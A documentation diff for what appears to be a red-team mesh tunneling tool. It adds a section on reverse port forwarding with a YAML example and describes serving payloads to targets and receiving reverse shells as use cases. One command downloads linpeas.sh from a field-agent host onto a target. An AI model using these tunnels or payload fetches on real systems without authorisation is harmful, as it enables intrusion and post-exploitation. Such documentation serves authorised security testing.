@@ -163,3 +163,31 @@ flowchart LR
 | Interactive SSH | 8-12 | Latency (~5-50ms/hop) |
 | File Transfer | 12-16 | Throughput |
 | High-latency WAN | 4-6 | 30s stream timeout |
+
+## Port Forwarding (Reverse Tunnels)
+
+Port forwarding creates reverse tunnels - the opposite direction from SOCKS5. Instead of reaching remote destinations, you expose local services so remote machines can reach you.
+
+**Key use cases:**
+
+- **Tool distribution**: Serve payloads from your operator machine to any target in the mesh
+- **C2 callbacks**: Receive reverse shells through the mesh network
+- **Service exposure**: Share development servers or staging environments
+
+```yaml
+# Operator machine - expose local web server
+forward:
+  endpoints:
+    - key: "tools"
+      target: "localhost:8000"
+
+# Field agents - accept remote connections
+forward:
+  listeners:
+    - key: "tools"
+      address: ":8080"
+```
+
+From any target: `curl http://field-agent:8080/linpeas.sh -o /tmp/lp.sh`
+
+See [Port Forwarding](/features/port-forwarding) for configuration details and additional scenarios.
